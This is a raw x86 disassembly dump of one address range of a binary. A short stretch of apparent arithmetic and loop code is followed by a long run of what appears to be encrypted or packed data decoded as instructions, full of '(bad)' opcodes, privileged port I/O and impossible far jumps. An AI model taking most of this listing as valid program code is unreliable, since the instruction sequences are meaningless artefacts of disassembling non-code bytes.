  418420:	mov    ebx,DWORD PTR [ebp-0x54]
  418423:	add    edx,0x64f8da
  418429:	or     edx,ebx
  41842b:	mov    DWORD PTR [ebp-0x54],edx
  41842e:	mov    edx,DWORD PTR [ebp+0x8]
  418431:	mov    ebx,DWORD PTR [ebp-0x50]
  418434:	add    edx,ecx
  418436:	xor    edx,ebx
  418438:	mov    DWORD PTR [ebp-0x50],edx
  41843b:	mov    edx,DWORD PTR [ebp+0x8]
  41843e:	mov    ebx,DWORD PTR [ebp-0x4c]
  418441:	add    edx,edi
  418443:	and    edx,ebx
  418445:	mov    DWORD PTR [ebp-0x4c],edx
  418448:	mov    edx,DWORD PTR [ebp+0x8]
  41844b:	mov    ebx,DWORD PTR [ebp-0x48]
  41844e:	lea    edx,[ebx+edx*1+0x241fc1f]
  418455:	mov    DWORD PTR [ebp-0x48],edx
  418458:	mov    edx,DWORD PTR [ebp+0x8]
  41845b:	mov    ebx,0xfa5e15e2
  418460:	sub    ebx,edx
  418462:	add    ebx,DWORD PTR [ebp-0x44]
  418465:	mov    DWORD PTR [ebp-0x44],ebx
  418468:	mov    edx,DWORD PTR [ebp+0x8]
  41846b:	xor    edx,eax
  41846d:	add    edx,esi
  41846f:	jne    0x4183f8
  418475:	jmp    0x41cb94
  41847a:	jmp    0x41a7c3
  41847f:	adc    BYTE PTR [edi],cl
  418481:	lods   eax,DWORD PTR ds:[esi]
  418482:	fnsave [ebx-0x21]
  418485:	lock jae 0x41841c
  418488:	sbb    DWORD PTR [edx-0x4],ebx
  41848b:	xor    DWORD PTR [edx],0xffffff80
  41848e:	fxch   st(4)
  418490:	xor    BYTE PTR [ebp+0x7c],bh
  418493:	inc    eax
  418494:	pop    edi
  418495:	jl     0x418513
  418497:	loopne 0x418485
  418499:	pop    edi
  41849a:	fsub   st(0),st
  41849c:	outs   dx,BYTE PTR ds:[esi]
  41849d:	shl    bh,1
  41849f:	jg     0x4184fc
  4184a1:	inc    edx
  4184a2:	adc    bh,BYTE PTR [edx]
  4184a4:	call   0xb9cbde34
  4184a9:	push   es
  4184aa:	cmp    eax,0xa309cffd
  4184af:	aad    0xf6
  4184b1:	clc    
  4184b2:	jae    0x418448
  4184b4:	rcr    DWORD PTR [esi+esi*1],0x5b
  4184b8:	xchg   esp,eax
  4184b9:	ret    
  4184ba:	(bad)
  4184bf:	sub    cl,BYTE PTR [eax]
  4184c1:	loop   0x4184e3
  4184c3:	aam    0x7b
  4184c5:	mov    cl,0xe5
  4184c7:	mov    ah,0x4b
  4184c9:	add    eax,0x1205642
  4184ce:	push   eax
  4184cf:	nop
  4184d0:	out    dx,al
  4184d1:	jae    0x418500
  4184d3:	fld    QWORD PTR [ebp+0x24b8707c]
  4184d9:	mov    bh,0x28
  4184db:	or     eax,0x4d2ae5b5
  4184e0:	(bad)  
  4184e4:	retf   
  4184e5:	lock jns 0x4184f4
  4184e8:	push   ds
  4184e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184ea:	or     eax,0xfc1db293
  4184ef:	xchg   DWORD PTR [ecx+0x591c5610],edi
  4184f5:	mov    ds:0xa8dc3365,al
  4184fa:	out    dx,eax
  4184fb:	mov    bh,0xad
  4184fd:	(bad)  
  4184fe:	and    ebp,ecx
  418500:	fbld   TBYTE PTR ds:0x4bc6551d
  418506:	pop    edi
  418507:	jge    0x4184be
  418509:	sar    DWORD PTR [eax+eax*4-0x66eb0e42],0xcc
  418511:	in     al,0xa9
  418513:	test   eax,0x63a36cf0
  418518:	data16 (bad) 
  41851a:	(bad)  
  41851b:	stos   DWORD PTR es:[edi],eax
  41851c:	data16 sub BYTE PTR [ebp+0x6a3fcb17],ch
  418523:	jle    0x4184e3
  418525:	jmp    0x418559
  418527:	arpl   WORD PTR ds:0x73efece0,bp
  41852d:	das    
  41852e:	dec    esi
  41852f:	push   esp
  418530:	push   ecx
  418531:	call   0xe375e214
  418536:	leave  
  418537:	xor    cl,BYTE PTR [ecx]
  418539:	mov    BYTE PTR [esi-0x54],0x51
  41853d:	push   es
  41853e:	(bad)  
  41853f:	xchg   esi,eax
  418540:	jo     0x4184f4
  418542:	xor    dh,bl
  418544:	gs repnz (bad) 
  418547:	pusha  
  418548:	retf   
  418549:	and    DWORD PTR [eax],ebp
  41854b:	xchg   ebx,eax
  41854c:	test   DWORD PTR [ecx],edx
  41854e:	xor    al,BYTE PTR [ecx]
  418550:	sbb    eax,DWORD PTR [ebp-0x7a]
  418553:	dec    ebp
  418554:	sbb    BYTE PTR [esi-0x6e],bl
  418557:	ins    DWORD PTR es:[edi],dx
  418558:	dec    eax
  418559:	frstor [ebx-0x57243e16]
  41855f:	data16 jle 0x418509
  418562:	cdq    
  418563:	test   DWORD PTR [eax],eax
  418565:	ds mov dh,0xa9
  418568:	or     esi,DWORD PTR [esi+ebp*1]
  41856b:	daa    
  41856c:	and    dl,bl
  41856e:	xchg   esp,eax
  41856f:	add    ebp,DWORD PTR [eax-0x3d]
  418572:	test   eax,0x680041f6
  418577:	mov    DWORD PTR [edx],ebp
  418579:	xchg   edi,eax
  41857a:	cdq    
  41857b:	mov    edx,0x89739e70
  418580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418581:	sbb    al,0xa2
  418583:	mov    bl,0xec
  418585:	cmp    eax,DWORD PTR [eax-0x2e]
  418588:	cwde   
  418589:	(bad)  
  41858a:	dec    ebp
  41858b:	mov    al,0x9e
  41858d:	pop    ss
  41858e:	jmp    0x418512
  418590:	add    eax,0x21411699
  418595:	pop    eax
  418596:	shl    al,cl
  418598:	push   edx
  418599:	pop    esi
  41859a:	adc    al,0xa7
  41859c:	and    al,0x4
  41859e:	rol    DWORD PTR [esi+0x29],1
  4185a1:	js     0x418612
  4185a3:	gs retf 
  4185a5:	mov    ebp,0xd5ab958
  4185aa:	xor    ch,BYTE PTR [ebx]
  4185ac:	arpl   WORD PTR [edx-0x6f6b2fca],sp
  4185b2:	jecxz  0x41853e
  4185b4:	mov    eax,ds:0x45812d10
  4185b9:	test   al,0x88
  4185bb:	scas   al,BYTE PTR es:[edi]
  4185bc:	xor    al,0xfa
  4185be:	jmp    0xecfa3b3
  4185c3:	and    ebx,DWORD PTR [ebp+0x1b]
  4185c6:	sub    eax,0xa6686a2d
  4185cb:	adc    bh,BYTE PTR [ebx-0x7e]
  4185ce:	jnp    0x41862b
  4185d0:	(bad)  
  4185d1:	stos   DWORD PTR es:[edi],eax
  4185d2:	js     0x41856a
  4185d4:	inc    BYTE PTR [ecx-0x77831f9f]
  4185da:	xchg   ecx,eax
  4185db:	cmp    eax,0x3746af1e
  4185e0:	loope  0x418604
  4185e2:	sbb    eax,0xeb0b63e
  4185e7:	push   esp
  4185e8:	pop    eax
  4185e9:	cld    
  4185ea:	aam    0x19
  4185ec:	adc    al,0x62
  4185ee:	adc    eax,0xfe47fb10
  4185f3:	xchg   ebp,eax
  4185f4:	dec    ebx
  4185f5:	pop    edx
  4185f6:	cmp    al,0xca
  4185f8:	xchg   ebp,eax
  4185f9:	ror    BYTE PTR [ebx+esi*4-0x2ad1972a],cl
  418600:	shl    BYTE PTR [edi+0x754e97ab],cl
  418606:	and    eax,0x26ad8115
  41860b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41860c:	xchg   edi,eax
  41860d:	xchg   ecx,eax
  41860e:	out    0x3b,eax
  418610:	dec    edx
  418611:	iret   
  418612:	dec    esp
  418613:	sbb    BYTE PTR [ecx-0x2d4e3e91],0x37
  41861a:	push   DWORD PTR [edx]
  41861c:	or     DWORD PTR [eax+0x346f029b],ebp
  418622:	sub    al,0xd9
  418624:	pop    ss
  418625:	mov    DWORD PTR [ebp+0x163c40ba],0x40642c02
  41862f:	cmp    al,0xc
  418631:	add    al,0x77
  418633:	idiv   ah
  418635:	sub    cl,al
  418637:	jnp    0x4186b4
  418639:	pop    ds
  41863a:	arpl   dx,sp
  41863c:	cmp    BYTE PTR [edi-0x235c248a],cl
  418642:	add    ch,BYTE PTR [ebx-0x1a]
  418645:	pop    es
  418646:	lock cli 
  418648:	lock icebp 
  41864a:	rcr    dl,cl
  41864c:	js     0x4185e0
  41864e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41864f:	popa   
  418650:	jmp    0xf9770442
  418655:	mov    ch,al
  418657:	ror    BYTE PTR [ebx-0x16],cl
  41865a:	pop    edi
  41865b:	cmp    dl,0x2e
  41865e:	out    dx,al
  41865f:	inc    ebx
  418660:	sbb    BYTE PTR [ebx],bh
  418662:	cmp    edx,ebx
  418664:	int3   
  418665:	push   esi
  418666:	gs mov ebx,ebx
  418669:	leave  
  41866a:	inc    ecx
  41866b:	outs   dx,BYTE PTR ds:[esi]
  41866c:	fcomp  QWORD PTR [ebx-0x1a]
  41866f:	jmp    0x41860a
  418671:	test   eax,0x311c152a
  418676:	xchg   esp,eax
  418677:	sub    DWORD PTR [eax+0xca7b538],0xffffff9c
  41867e:	push   0x52
  418680:	add    dh,ah
  418682:	repnz cmp ch,BYTE PTR [ebx-0x24]
  418686:	retf   
  418687:	cmp    ebx,edi
  418689:	dec    ebp
  41868a:	mov    esi,DWORD PTR [ebp+ebx*1+0x472c21ae]
  418691:	lds    esi,FWORD PTR [ebx+ebx*1+0x40]
  418695:	mov    eax,ds:0xd0f70015
  41869a:	jg     0x4186db
  41869c:	sbb    DWORD PTR [ebp+eax*4-0x46e382dd],ebx
  4186a3:	mov    eax,ds:0xae1ea75b
  4186a8:	xor    esp,DWORD PTR [edx-0xae03c81]
  4186ae:	sbb    al,0x53
  4186b0:	or     edi,eax
  4186b2:	outs   dx,DWORD PTR ds:[esi]
  4186b3:	cmp    ebp,DWORD PTR [ebp+0x59de4ea0]
  4186b9:	call   0xa249:0x960f3abe
  4186c0:	mov    ds:0x502ed7b9,eax
  4186c5:	push   ds
  4186c6:	shr    esp,cl
  4186c8:	add    DWORD PTR [esi+0x4f4765d1],ebp
  4186ce:	jno    0x4186ba
  4186d0:	mov    ds:0xa8c6450f,al
  4186d5:	or     BYTE PTR [ebx],ch
  4186d7:	mov    edi,DWORD PTR [edx]
  4186d9:	dec    ecx
  4186da:	test   DWORD PTR [ebx-0x3a642c87],0xd780b3f3
  4186e4:	retf   0xfa0c
  4186e7:	fisub  WORD PTR [esi-0x5f]
  4186ea:	ins    BYTE PTR es:[edi],dx
  4186eb:	or     al,0x9e
  4186ed:	popa   
  4186ee:	mov    ebp,0xc2d439d8
  4186f3:	push   edx
  4186f4:	aad    0x81
  4186f6:	les    ecx,FWORD PTR [esi-0x1e256315]
  4186fc:	mov    esi,0x4464db0c
  418701:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418702:	sbb    al,0x4f
  418704:	int    0xcb
  418706:	stc    
  418707:	ror    BYTE PTR [eax-0x769f2c7f],1
  41870d:	lods   eax,DWORD PTR ds:[esi]
  41870e:	icebp  
  41870f:	retf   
  418710:	popa   
  418711:	aam    0x38
  418713:	mov    cl,0x63
  418715:	mov    bl,0x21
  418717:	xor    BYTE PTR [eax+0x3ba81652],dl
  41871d:	idiv   BYTE PTR [esi+0x6cb1745d]
  418723:	mov    WORD PTR [eax],?
  418725:	sar    DWORD PTR [eax],1
  418727:	mov    ecx,0x63f4986f
  41872c:	jg     0x418732
  41872e:	aaa    
  41872f:	loopne 0x4186db
  418731:	mov    esi,0x3475052f
  418736:	jl     0x4186f4
  418738:	mov    ch,0x91
  41873a:	int    0xf9
  41873c:	xor    al,0x51
  41873e:	or     ch,0x38
  418741:	mov    eax,ds:0x314eb8d6
  418746:	adc    edi,DWORD PTR [esi+0x5ab1ba4e]
  41874c:	inc    ecx
  41874d:	call   0xa818b102
  418752:	int    0x6a
  418754:	add    ebx,DWORD PTR ds:0x140ab067
  41875a:	test   eax,0x817728ac
  41875f:	adc    al,0xdf
  418761:	mov    ecx,0x14de519f
  418766:	out    0x54,al
  418768:	push   edx
  418769:	add    al,BYTE PTR [edi-0x67]
  41876c:	out    0xa0,al
  41876e:	cli    
  41876f:	inc    esi
  418770:	adc    edi,DWORD PTR [eiz*1-0x2f8897cf]
  418777:	idiv   DWORD PTR [ebx]
  418779:	add    esp,eax
  41877b:	mov    ebx,0x3fe284db
  418780:	or     ebp,DWORD PTR [ecx-0x42]
  418783:	mov    edi,0x3ba95428
  418788:	enter  0xa501,0xbc
  41878c:	and    edi,esi
  41878e:	ror    dh,0xe9
  418791:	jnp    0x418720
  418793:	jp     0x4187d8
  418795:	fst    st(1)
  418797:	pop    ds
  418798:	popa   
  418799:	bound  ecx,QWORD PTR [esi+0x26]
  41879c:	pop    ebp
  41879d:	in     eax,0x27
  41879f:	call   0x593c:0xcceabe16
  4187a6:	jg     0x418792
  4187a8:	adc    edx,DWORD PTR [ecx+0x3c]
  4187ab:	push   edi
  4187ac:	nop
  4187ad:	ins    BYTE PTR es:[edi],dx
  4187ae:	loopne 0x4187f0
  4187b0:	rcr    DWORD PTR [ebx-0x6d4296a3],0x11
  4187b7:	adc    DWORD PTR [edx+0x3],edi
  4187ba:	sub    dl,BYTE PTR [ebx]
  4187bc:	bswap  ebp
  4187be:	rcr    BYTE PTR [edi+0x18f9a2da],1
  4187c4:	push   eax
  4187c5:	add    al,0x12
  4187c7:	lds    ebx,FWORD PTR [edx-0x4e]
  4187ca:	jl     0x4187db
  4187cc:	push   cs
  4187cd:	in     al,dx
  4187ce:	mov    dl,0xad
  4187d0:	dec    ebp
  4187d1:	and    dl,cl
  4187d3:	sti    
  4187d4:	push   0xffffffe0
  4187d6:	or     al,BYTE PTR ds:0xe8f1c89e
  4187dc:	sub    bh,ch
  4187de:	and    al,0x5d
  4187e0:	retf   0x263c
  4187e3:	scas   al,BYTE PTR es:[edi]
  4187e4:	lods   al,BYTE PTR ds:[esi]
  4187e5:	outs   dx,BYTE PTR ds:[esi]
  4187e6:	outs   dx,DWORD PTR ds:[esi]
  4187e7:	shl    DWORD PTR [edx+0x53],0xec
  4187eb:	pop    ebp
  4187ec:	sbb    edi,DWORD PTR [ebp+0x11]
  4187ef:	out    dx,al
  4187f0:	jbe    0x41886f
  4187f2:	stos   DWORD PTR es:[edi],eax
  4187f3:	lds    edi,FWORD PTR [ebx+0x487ae38a]
  4187f9:	ss (bad) 
  4187fb:	mov    dl,0x9d
  4187fd:	ror    BYTE PTR ds:0xbe56cc75,0x6d
  418804:	call   ebp
  418806:	mov    bl,0x5b
  418808:	sub    BYTE PTR [ecx+0x45e26437],dh
  41880e:	mov    al,ds:0x7db603be
  418813:	sub    ebp,ebx
  418815:	cdq    
  418816:	lods   eax,DWORD PTR ds:[esi]
  418817:	mov    ds:0x38055f10,eax
  41881c:	ret    0x88ec
  41881f:	nop
  418820:	mul    DWORD PTR [ebp-0x4c]
  418823:	dec    esp
  418824:	adc    eax,0xc5c06c6
  418829:	jp     0x418820
  41882b:	cwde   
  41882c:	daa    
  41882d:	or     eax,0x5851724
  418832:	ins    DWORD PTR es:[edi],dx
  418833:	fsubr  QWORD PTR [edi]
  418835:	and    edi,ecx
  418837:	xor    al,0x34
  418839:	stos   BYTE PTR es:[edi],al
  41883a:	(bad)  
  41883b:	xchg   edi,eax
  41883c:	nop
  41883d:	inc    ebp
  41883e:	inc    bl
  418840:	mov    ds:0xd3d32aa8,al
  418845:	lea    ebx,[ebx+ecx*1+0x10563c22]
  41884c:	push   0x44
  41884e:	mov    dh,0xff
  418850:	push   es
  418851:	jo     0x4187f1
  418853:	sbb    al,0x66
  418855:	sub    BYTE PTR [ebp-0x4aad50f1],cl
  41885b:	pop    ebx
  41885c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41885d:	pushf  
  41885e:	ffreep st(0)
  418860:	jg     0x4188db
  418862:	dec    ecx
  418863:	jle    0x4188af
  418865:	je     0x4188b5
  418867:	inc    ebx
  418868:	add    ebx,esp
  41886a:	jne    0x4187f7
  41886c:	xchg   BYTE PTR [edx-0x75],dl
  41886f:	xor    eax,0x732771fb
  418874:	inc    edi
  418875:	mov    BYTE PTR [ecx+0x7b],al
  418878:	mov    BYTE PTR [esi+0x30],dl
  41887b:	int3   
  41887c:	out    0x30,al
  41887e:	fsubr  DWORD PTR [ebx]
  418880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418881:	out    0x41,eax
  418883:	retf   
  418884:	iret   
  418885:	lods   al,BYTE PTR ds:[esi]
  418886:	outs   dx,DWORD PTR ds:[esi]
  418887:	push   ds
  418888:	mov    eax,fs:0x90b925ce
  41888e:	jns    0x4188e0
  418890:	mov    dh,BYTE PTR [esi+0x3da1a1d3]
  418896:	aas    
  418897:	loope  0x4188bf
  418899:	jle    0x418876
  41889b:	sbb    DWORD PTR [esi-0xb],ebx
  41889e:	inc    ebx
  41889f:	dec    ebp
  4188a0:	addr16 popa 
  4188a2:	sti    
  4188a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188a4:	int    0xcf
  4188a6:	add    DWORD PTR [esi-0x7aece020],esp
  4188ac:	add    dl,BYTE PTR [esp+eax*8]
  4188af:	add    al,0xdf
  4188b1:	leave  
  4188b2:	push   0x4bf2589
  4188b7:	stc    
  4188b8:	mov    ah,dl
  4188ba:	sub    DWORD PTR [edx+0x1c],0xffffffa8
  4188be:	jl     0x4188e6
  4188c0:	aam    0x59
  4188c2:	mov    edi,0x349ac844
  4188c7:	div    bh
  4188c9:	xor    ah,ch
  4188cb:	sbb    DWORD PTR gs:[ecx-0x5da70ec9],0xffffff86
  4188d3:	int3   
  4188d4:	jmp    0xc9b8:0xb39b351c
  4188db:	aam    0x79
  4188dd:	lds    ecx,FWORD PTR [ecx]
  4188df:	out    dx,al
  4188e0:	scas   eax,DWORD PTR es:[edi]
  4188e1:	pop    es
  4188e2:	scas   eax,DWORD PTR es:[edi]
  4188e3:	inc    edx
  4188e4:	push   0xf085c33b
  4188e9:	add    al,0xb4
  4188eb:	test   eax,0x49137b26
  4188f0:	mov    ebp,0xae250b57
  4188f5:	fcmovu st,st(4)
  4188f7:	(bad)  
  4188f8:	cli    
  4188f9:	(bad)  
  4188fa:	sbb    eax,0x1bcf2c2a
  4188ff:	xlat   BYTE PTR ds:[ebx]
  418900:	clc    
  418901:	and    BYTE PTR ds:0xbfc16ef0,0xbf
  418908:	mov    ecx,0xcacb25b7
  41890d:	ds pop ecx
  41890f:	lock and bh,dh
  418912:	ret    0x7830
  418915:	ss push ebp
  418917:	(bad)
  41891a:	popf   
  41891b:	or     BYTE PTR [esp+ebx*1],0x13
  41891f:	cmp    al,0xe3
  418921:	lods   al,BYTE PTR ds:[esi]
  418922:	test   al,0xe5
  418924:	in     al,dx
  418925:	or     eax,0x592f7b69
  41892a:	jle    0x4188e2
  41892c:	and    al,0xeb
  41892e:	lds    esi,FWORD PTR [eax]
  418930:	cmp    eax,0xbf89cc81
  418935:	lahf   
  418936:	cdq    
  418937:	mov    ch,0x4c
  418939:	and    eax,0x793a6d49
  41893e:	xchg   esp,eax
  41893f:	xor    edi,DWORD PTR ds:0x813c538c
  418945:	adc    eax,0x33133ca3
  41894a:	xchg   edx,eax
  41894b:	jnp    0x41895d
  41894d:	mov    al,0x57
  41894f:	xor    al,0x1b
  418951:	cmp    al,0x1c
  418953:	add    BYTE PTR [edx-0x4f],0xdc
  418957:	xlat   BYTE PTR ds:[ebx]
  418958:	sahf   
  418959:	cs xchg ebp,eax
  41895b:	jo     0x4189a8
  41895d:	je     0x418984
  41895f:	jmp    0x41893e
  418961:	xor    al,0xaf
  418963:	loop   0x41896f
  418965:	mov    ebp,DWORD PTR [edi+ebp*4+0x7d]
  418969:	lock pop ss
  41896b:	in     al,0x1f
  41896d:	out    0x34,eax
  41896f:	in     al,dx
  418970:	sti    
  418971:	xchg   edx,eax
  418972:	shl    BYTE PTR [edi+eiz*2],0x30
  418976:	lock mov bh,0x44
  418979:	mov    cl,0xbd
  41897b:	sti    
  41897c:	mov    ?,edx
  41897e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41897f:	push   0xffffffd9
  418981:	sub    al,0xa
  418983:	cmp    al,0x5f
  418985:	jo     0x418948
  418987:	cdq    
  418988:	pop    es
  418989:	adc    eax,0x66d8edd3
  41898e:	pop    esp
  41898f:	shl    DWORD PTR [edx-0x29],0xe3
  418993:	loopne 0x4189fb
  418995:	jae    0x41892d
  418997:	(bad)  
  418998:	pop    ds
  418999:	stc    
  41899a:	xor    DWORD PTR [ecx+esi*8-0x76],esi
  41899e:	mov    al,0x68
  4189a0:	repz jae 0x4189f4
  4189a3:	cmp    esi,DWORD PTR [esi-0x60a4de94]
  4189a9:	repz adc eax,0x87b41503
  4189af:	push   ebx
  4189b0:	cwde   
  4189b1:	loopne 0x418975
  4189b3:	test   eax,0x395b2149
  4189b8:	add    BYTE PTR [eax],ch
  4189ba:	adc    edx,DWORD PTR [edx+0x5a86e0a8]
  4189c0:	inc    eax
  4189c1:	and    al,BYTE PTR [edi-0x49]
  4189c4:	repnz int3 
  4189c6:	lock lea edx,[esi+ebp*1+0x5d1ff681]
  4189ce:	cli    
  4189cf:	out    0x28,al
  4189d1:	push   ecx
  4189d2:	sbb    eax,0xeca858ed
  4189d7:	and    BYTE PTR [ecx],ch
  4189d9:	mov    ds:0xc2a45f6a,al
  4189de:	xor    al,0xf0
  4189e0:	jne    0x418968
  4189e2:	dec    esi
  4189e3:	push   0xff80d32e
  4189e8:	out    dx,al
  4189e9:	cmp    al,0xd8
  4189eb:	shl    DWORD PTR [edi],1
  4189ed:	repz push ss
  4189ef:	lods   al,BYTE PTR ds:[esi]
  4189f0:	cdq    
  4189f1:	in     al,dx
  4189f2:	xchg   DWORD PTR [ecx],ebp
  4189f4:	sub    bh,BYTE PTR [eax+ecx*4-0x15]
  4189f8:	dec    ebp
  4189f9:	dec    edx
  4189fa:	cdq    
  4189fb:	ror    dl,0x48
  4189fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189ff:	es xchg esp,esp
  418a02:	sar    BYTE PTR [edx+0x6],1
  418a05:	xchg   esi,eax
  418a06:	dec    si
  418a08:	repz fbstp TBYTE PTR [edx-0x77]
  418a0c:	js     0x4189fb
  418a0e:	test   DWORD PTR [ecx+ecx*8+0x28],edi
  418a12:	or     eax,0x67f22d4c
  418a17:	mov    al,0x5e
  418a19:	aas    
  418a1a:	jg     0x4189f2
  418a1c:	js     0x418a01
  418a1e:	add    eax,0x4383c11
  418a23:	pop    ebp
  418a24:	test   BYTE PTR ds:0x36041615,0xef
  418a2b:	add    DWORD PTR [ecx],esi
  418a2d:	test   DWORD PTR [edx+ebx*4+0x1],edx
  418a31:	lock call 0x668a9a20
  418a37:	stos   BYTE PTR es:[edi],al
  418a38:	add    eax,0x809d889d
  418a3d:	add    al,0x1d
  418a3f:	popa   
  418a40:	or     al,0x96
  418a42:	sahf   
  418a43:	jp     0x4189fd
  418a45:	hlt    
  418a46:	mov    ebp,0xccf61e38
  418a4b:	bound  edx,QWORD PTR [ebx-0x1a0f3e58]
  418a51:	fwait
  418a52:	into   
  418a53:	mov    bl,BYTE PTR [ebx]
  418a55:	inc    ecx
  418a56:	std    
  418a57:	ror    BYTE PTR [ecx-0x38],1
  418a5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a5b:	pop    edx
  418a5c:	repz gs inc esi
  418a5f:	cmp    al,0xfc
  418a61:	and    al,0xcc
  418a63:	inc    ecx
  418a65:	cmp    edi,ecx
  418a67:	or     eax,DWORD PTR [esi]
  418a69:	fdivrp st(1),st
  418a6b:	stos   BYTE PTR es:[edi],al
  418a6c:	jmp    0xc4d0b7f1
  418a71:	push   esp
  418a73:	in     eax,0x6a
  418a75:	(bad)  
  418a77:	jae    0x418ad7
  418a79:	test   DWORD PTR [edx-0x52],ebx
  418a7c:	add    ecx,DWORD PTR [eax-0x29]
  418a7f:	xchg   edx,eax
  418a80:	sub    al,0x65
  418a82:	pop    edi
  418a83:	lds    eax,FWORD PTR [edi+0x43387bb4]
  418a89:	cmp    bl,BYTE PTR [esi]
  418a8b:	jmp    0xd443:0x9ec532d3
  418a92:	mov    ch,0x9c
  418a94:	iret   
  418a95:	or     al,0x8d
  418a97:	jnp    0x418ad3
  418a99:	pop    esi
  418a9a:	sahf   
  418a9b:	addr16 shl ebx,0xa2
  418a9f:	jg     0x418a4d
  418aa1:	dec    esi
  418aa2:	mov    bl,al
  418aa4:	(bad)  
  418aa5:	pop    eax
  418aa6:	mov    bh,0x98
  418aa8:	movd   mm3,DWORD PTR [ebx-0x2e309098]
  418aaf:	cld    
  418ab0:	dec    edx
  418ab1:	sub    al,0x4f
  418ab3:	gs inc esp
  418ab5:	pop    edx
  418ab6:	lea    ecx,[ebp+0x2d]
  418ab9:	mov    edi,0xdf18b4ca
  418abe:	pop    ebx
  418abf:	test   BYTE PTR [edi+0x2b8ab7b6],bh
  418ac5:	cld    
  418ac6:	inc    ebp
  418ac7:	jle    0x418aa3
  418ac9:	(bad)  
  418aca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418acb:	test   DWORD PTR [edi+0x19],esp
  418ace:	retf   0x1a7e
  418ad1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ad2:	pop    esp
  418ad3:	adc    cl,BYTE PTR [esi-0x3784914f]
  418ad9:	add    BYTE PTR [ebx+ecx*8+0x15],ch
  418add:	stos   DWORD PTR es:[edi],eax
  418ade:	call   FWORD PTR [esi+0x2e519e83]
  418ae4:	dec    ebx
  418ae5:	cmp    ch,BYTE PTR [ebp-0x532ece68]
  418aeb:	sbb    al,BYTE PTR [eax]
  418aed:	push   edi
  418aee:	dec    edx
  418aef:	xor    DWORD PTR [esi+0x2c2f6f26],0x6f
  418af6:	sbb    DWORD PTR [ebp-0x64],edi
  418af9:	loope  0x418ae7
  418afb:	adc    esi,eax
  418afd:	add    BYTE PTR [ebp-0x2209a346],ah
  418b03:	and    ch,BYTE PTR [edx-0x4c]
  418b06:	adc    DWORD PTR [eax-0x60],0x57
  418b0a:	dec    ebx
  418b0b:	test   al,0x2d
  418b0d:	pusha  
  418b0e:	mov    al,ds:0x74dc8382
  418b13:	(bad)  
  418b14:	mov    ebp,0xa7447a89
  418b19:	jmp    0x6ccf551b
  418b1e:	aaa    
  418b1f:	std    
  418b20:	or     DWORD PTR [ecx],edx
  418b22:	std    
  418b23:	inc    ecx
  418b24:	pop    edx
  418b25:	jp     0x418b2a
  418b27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b28:	adc    eax,0xe4e804bb
  418b2d:	inc    ecx
  418b2e:	dec    eax
  418b2f:	lock pop esi
  418b31:	cmp    al,0x75
  418b33:	xchg   esp,eax
  418b34:	inc    ebx
  418b35:	jbe    0x418aea
  418b37:	sahf   
  418b38:	dec    ebx
  418b39:	mov    al,ds:0x5b81f4d9
  418b3e:	fmul   st(7),st
  418b40:	add    eax,0x897fea98
  418b45:	into   
  418b46:	and    eax,0x4cf58601
  418b4b:	std    
  418b4c:	in     al,0x43
  418b4e:	dec    ebp
  418b4f:	xlat   BYTE PTR ds:[ebx]
  418b50:	pop    esi
  418b51:	xor    dl,BYTE PTR [ebp-0x5947428f]
  418b57:	mov    esp,DWORD PTR [ecx-0x74]
  418b5a:	xchg   edi,eax
  418b5b:	fnsave [ecx+0x25]
  418b5e:	scas   eax,DWORD PTR es:[edi]
  418b5f:	jmp    0x418bda
  418b61:	aaa    
  418b62:	adc    bl,BYTE PTR [esi]
  418b64:	enter  0xc143,0xdf
  418b68:	icebp  
  418b69:	sub    eax,ebp
  418b6b:	pop    ebp
  418b6c:	or     ecx,DWORD PTR [esi-0x23]
  418b6f:	dec    ebp
  418b70:	mov    ss,edx
  418b72:	(bad)  
  418b73:	cmp    al,0xdd
  418b75:	mov    ebp,0xaa3b453e
  418b7a:	xchg   edi,eax
  418b7b:	call   0x983e:0x49ab5380
  418b82:	int3   
  418b83:	cdq    
  418b84:	sbb    edx,esi
  418b86:	mov    eax,ds:0x6c4f04e3
  418b8b:	or     DWORD PTR [ecx-0x13],ebp
  418b8e:	aaa    
  418b8f:	push   ds
  418b90:	push   edx
  418b91:	into   
  418b92:	lods   eax,DWORD PTR ds:[esi]
  418b93:	out    dx,al
  418b94:	sub    eax,0xd530cdba
  418b99:	inc    edx
  418b9a:	or     BYTE PTR [eax+eiz*4],bl
  418b9d:	mov    ds:0x5c2497aa,eax
  418ba2:	pop    ebx
  418ba3:	push   ss
  418ba4:	stos   DWORD PTR es:[edi],eax
  418ba5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ba6:	jbe    0x418c20
  418ba8:	mov    eax,ds:0x8dbf2383
  418bad:	jne    0x418b79
  418baf:	mov    edx,0x89bab8ba
  418bb4:	(bad)  
  418bb5:	in     eax,dx
  418bb6:	(bad)
  418bb9:	and    DWORD PTR [ecx-0x6de19683],edi
  418bbf:	jle    0x418bdc
  418bc1:	mov    dh,0x5c
  418bc3:	and    dl,BYTE PTR [ebp-0x4f]
  418bc6:	mov    dh,0x5
  418bc8:	in     al,0xe3
  418bca:	mov    DWORD PTR [edx],edi
  418bcc:	adc    esp,ebx
  418bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bcf:	cmp    DWORD PTR [eax-0x4cb30fc4],edx
  418bd5:	not    DWORD PTR [ebx+0x237b2b6c]
  418bdb:	ret    0x4093
  418bde:	adc    ebp,DWORD PTR [eax+0xc]
  418be1:	xchg   esp,eax
  418be2:	mov    ebp,0xda26a74f
  418be7:	jle    0x418bea
  418be9:	inc    esp
  418bea:	or     ebp,DWORD PTR [edi-0x6fb98778]
  418bf0:	fsincos 
  418bf2:	mov    ecx,0x2ec9e52a
  418bf7:	mov    esp,0xa1341684
